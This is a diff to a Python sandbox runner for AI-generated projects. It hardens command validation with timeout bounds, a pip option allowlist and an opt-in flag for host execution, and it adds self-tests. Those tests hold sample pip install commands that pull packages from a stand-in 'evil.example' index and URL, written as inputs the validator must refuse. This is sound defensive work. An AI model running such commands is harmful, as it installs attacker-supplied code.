@@ -67,6 +67,17 @@ class GeneratedProjectFile:
         return {"path": self.path, "content": self.content}
 
 
+#: Sanity bound for one generated command, not a work ceiling: a timeout the
+#: model proposes must be a finite number the sandbox can actually enforce.
+MAXIMUM_COMMAND_TIMEOUT_SECONDS = 24 * 60 * 60
+#: pip options a generated setup command may use; everything that changes
+#: where packages come from (index and link URLs, local paths) is refused.
+ALLOWED_PIP_OPTIONS = frozenset({
+    "--no-cache-dir", "--quiet", "-q", "--upgrade", "-U", "--no-deps",
+    "--prefer-binary", "--disable-pip-version-check", "--no-input",
+    "-r", "--requirement"})
+
+
 @dataclass(frozen=True)
 class GeneratedProjectCommand:
     """One argv-only Python command with a purpose and timeout."""
@@ -93,6 +104,13 @@ class GeneratedProjectCommand:
         if not self.purpose.strip() or self.timeout_seconds <= 0:
             raise GeneratedProjectError(
                 "generated command needs a purpose and positive timeout")
+        timeout = float(self.timeout_seconds)
+        if (isinstance(self.timeout_seconds, bool)
+                or timeout != timeout or timeout in (float("inf"), float("-inf"))
+                or timeout > MAXIMUM_COMMAND_TIMEOUT_SECONDS):
+            raise GeneratedProjectError(
+                "generated command timeout must be a finite number of seconds "
+                f"no greater than {MAXIMUM_COMMAND_TIMEOUT_SECONDS}")
         if self.command_kind not in GENERATED_COMMAND_KINDS:
             raise GeneratedProjectError(
                 "generated command kind must be setup, execute, or verify")
@@ -101,6 +119,16 @@ class GeneratedProjectCommand:
                 or tuple(argv[1:4]) != ("-m", "pip", "install")):
             raise GeneratedProjectError(
                 "network access is limited to python -m pip install setup")
+        if self.network_access:
+            for item in argv[4:]:
+                if ((item.startswith("-") and item not in ALLOWED_PIP_OPTIONS)
+                        or "://" in item or item.startswith("/")
+                        or item.startswith(".")):
+                    raise GeneratedProjectError(
+                        "pip install arguments are limited to requirement "
+                        "specifiers and the reviewed options "
+                        f"{sorted(ALLOWED_PIP_OPTIONS)}; index URLs, links, "
+                        "paths, and URLs are refused")
         expected = tuple(self.expected_exit_codes)
         if (not expected
                 or any(not isinstance(item, int) or isinstance(item, bool)
@@ -373,6 +401,9 @@ class GeneratedProjectAuthority:
     allow_workspace_writes: bool
     allow_sandbox_commands: bool
     allow_network_reads: bool
+    #: Host execution when Docker is absent. Off by default: a host process
+    #: has no operating-system sandbox, so the caller must ask for it.
+    allow_local_execution: bool = False
 
     def __post_init__(self) -> None:
         if not self.actor_id.strip():
@@ -499,7 +530,8 @@ def execute_generated_project(
     """Validate, write, run, and inspect one generated project attempt.
 
     Backend selection prefers the full Docker OS sandbox. When the Docker
-    command is absent, execution falls back to the restricted local backend
+    command is absent and the authority explicitly allows local execution,
+    execution falls back to the restricted local backend
     with the same file boundary, command allowlist, and exact per-effect
     approvals. The local fallback refuses dependency-network commands
     because a host process is not an operating-system sandbox, so the
@@ -542,6 +574,13 @@ def execute_generated_project(
         }
         fallback_note = None
     else:
+        if not request.authority.allow_local_execution:
+            raise GeneratedProjectError(
+                "sandbox unavailable: docker_unavailable: the Docker command "
+                f"is absent ({docker_availability.reason_code}) and host "
+                "execution was not authorized; pass --allow-local-execution "
+                "to run generated code as a host process without an "
+                "operating-system sandbox")
         from .workspace_local import RestrictedLocalWorkspace
 
         def operation_service(network_access: bool):
@@ -558,13 +597,15 @@ def execute_generated_project(
         sandbox_record = {
             "backend_kind": "restricted_local",
             "image": "",
-            "network_policy": "no_network_host_execution",
+            "network_policy": "host_process_network_unenforced",
             "fallback_reason_code": docker_availability.reason_code,
         }
         fallback_note = (
-            "Docker was unavailable so generated code ran in the restricted "
-            "local backend with the same file boundary and command allowlist. "
-            "Host commands are not an operating-system sandbox: dependency "
+            "Docker was unavailable and host execution was explicitly "
+            "authorized, so generated code ran as a host process with only "
+            "the workspace file boundary and command allowlist. A host "
+            "process is not an operating-system sandbox: it can reach the "
+            "network, the filesystem, and the parent environment. Dependency "
             "network commands were refused and verification evidence carries "
             "this limitation.")
 
@@ -862,7 +903,8 @@ def self_test() -> dict:
     context = GeneratedProjectExecutionContext(parent_loop=parent)
     authority = GeneratedProjectAuthority(
         "self-test", allow_workspace_writes=True,
-        allow_sandbox_commands=True, allow_network_reads=True)
+        allow_sandbox_commands=True, allow_network_reads=True,
+        allow_local_execution=True)
 
     def _docker_unavailable(spec=None, declaration=None):
         from .workspace_contracts import BackendAvailability
@@ -920,6 +962,49 @@ def self_test() -> dict:
                       "instead of an uncaught run failure",
         })
 
+    def _refused(**kwargs) -> bool:
+        try:
+            GeneratedProjectCommand(**kwargs)
+        except GeneratedProjectError:
+            return True
+        return False
+
+    tests.append({
+        "test": "non_finite_or_absurd_timeouts_are_refused",
+        "passed": (
+            _refused(argv=("python", "main.py"), purpose="run",
+                     timeout_seconds=float("inf"))
+            and _refused(argv=("python", "main.py"), purpose="run",
+                         timeout_seconds=float("nan"))
+            and _refused(argv=("python", "main.py"), purpose="run",
+                         timeout_seconds=MAXIMUM_COMMAND_TIMEOUT_SECONDS + 1)
+            and not _refused(argv=("python", "main.py"), purpose="run",
+                             timeout_seconds=300.0)),
+        "detail": "timeouts must be finite and enforceable"})
+    tests.append({
+        "test": "pip_setup_refuses_index_link_path_and_url_arguments",
+        "passed": (
+            _refused(argv=("python", "-m", "pip", "install", "--index-url",
+                           "http://evil.example/simple", "requests"),
+                     purpose="setup", command_kind="setup",
+                     network_access=True)
+            and _refused(argv=("python", "-m", "pip", "install",
+                               "https://evil.example/pkg.tar.gz"),
+                         purpose="setup", command_kind="setup",
+                         network_access=True)
+            and _refused(argv=("python", "-m", "pip", "install", "/tmp/pkg"),
+                         purpose="setup", command_kind="setup",
+                         network_access=True)
+            and not _refused(argv=("python", "-m", "pip", "install",
+                                   "--no-cache-dir", "pandas==2.2.0"),
+                             purpose="setup", command_kind="setup",
+                             network_access=True)),
+        "detail": "only requirement specifiers and reviewed pip options"})
+    tests.append({
+        "test": "host_execution_requires_explicit_authority",
+        "passed": GeneratedProjectAuthority(
+            "actor", True, True, False).allow_local_execution is False,
+        "detail": "allow_local_execution defaults to False"})
     passed = sum(item["passed"] for item in tests)
     return {
         "record_type": "generated_project_test/v1",
